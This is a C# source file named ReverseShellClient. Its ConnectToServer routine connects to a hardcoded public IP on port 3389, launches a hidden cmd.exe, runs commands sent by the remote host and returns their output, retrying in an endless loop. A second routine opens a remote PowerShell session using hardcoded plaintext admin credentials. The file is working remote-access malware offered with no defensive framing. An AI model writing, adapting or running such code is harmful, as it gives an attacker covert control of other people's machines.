using System;
using System.Diagnostics;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net;
using System.Net.Sockets;
using System.Security;
using System.Text;

namespace ReverseShellClient
{
    class Program
    {

        static StreamWriter streamWriter;
        static TcpClient tcpClient;
        static NetworkStream networkStream;
        static StreamReader streamReader;
        static Process processCmd;
        static StringBuilder strInput;

        static void Main(string[] args)
        {
            int port = args.Length > 0 ? int.Parse(args[0]) : 3389;// 6666;

            string[] ips = {
                //"192.168.2.116",
                //"192.168.1.111",
                "62.12.112.147"
            };
            int ipIndex = 0;

            while (true)
            {
                string tryIp = ips[ipIndex];
                ipIndex = (ipIndex + 1) % ips.Length;
                Console.WriteLine($"Trying to connect to {tryIp} on port {port}");

               // ConnectToServer(tryIp, port);
                RunCommands();
                System.Threading.Thread.Sleep(15000); //Wait 15 seconds 
               
            }
        }
        private static void RunCommands()
        {
            string userName = "Admin";
            string password = "Password123!";
            var securestring = new SecureString();
            foreach (Char c in password)
            {
                securestring.AppendChar(c);
            }
            PSCredential creds = new PSCredential(userName, securestring);
            WSManConnectionInfo connectionInfo = new WSManConnectionInfo();

            connectionInfo.ComputerName = "192.168.100.149";
            connectionInfo.Credential = creds;
            Runspace runspace = RunspaceFactory.CreateRunspace(connectionInfo);
            runspace.Open();
            using (PowerShell ps = PowerShell.Create())
            {
                ps.Runspace = runspace;
                ps.AddScript("ipconfig");
                StringBuilder sb = new StringBuilder();
                try
                {
                    var results = ps.Invoke();
                    foreach (var x in results)
                    {
                        sb.AppendLine(x.ToString());
                    }
                    Console.WriteLine(sb.ToString());
                }
                catch (Exception e)
                {
                    //problem running script
                }
            }
            runspace.Close();
            Console.ReadLine();
    }
        private static void ConnectToServer(string ip, int port)
        {
            tcpClient = new TcpClient();
            strInput = new StringBuilder();

            try
            {
                IPAddress ipAdress = IPAddress.Parse(ip);
                tcpClient.Connect(ipAdress, port);

                Console.WriteLine("Connected");

                //put your preferred IP here
                networkStream = tcpClient.GetStream();
                streamReader = new StreamReader(networkStream);
                streamWriter = new StreamWriter(networkStream);
            }
            catch (Exception err)
            {
                Console.WriteLine(err.Message);
                return;
            } //if no Client don't continue 

            processCmd = new Process();
            processCmd.StartInfo.FileName = "cmd.exe";
            processCmd.StartInfo.CreateNoWindow = true;
            processCmd.StartInfo.UseShellExecute = false;
            processCmd.StartInfo.RedirectStandardOutput = true;
            processCmd.StartInfo.RedirectStandardInput = true;
            processCmd.StartInfo.RedirectStandardError = true;
            processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
            processCmd.Start();
            processCmd.BeginOutputReadLine();

            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\n");
                    if (strInput.ToString().LastIndexOf("terminate") >= 0)
                    {
                        StopServer();
                    }
                    if (strInput.ToString().LastIndexOf("exit") >= 0)
                    {
                        throw new ArgumentException();
                    }

                    processCmd.StandardInput.WriteLine(strInput);
                    strInput.Remove(0, strInput.Length);
                }
                catch (Exception)
                {
                    Cleanup();
                    break;
                }
            }
        }
        private static void Cleanup()
        {
            try
            {
                processCmd.Kill();
            }
            catch (Exception)
            {
            };

            streamReader.Close();
            streamWriter.Close();
            networkStream.Close();
        }

        private static void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception) { }
            }
        }
    }

}
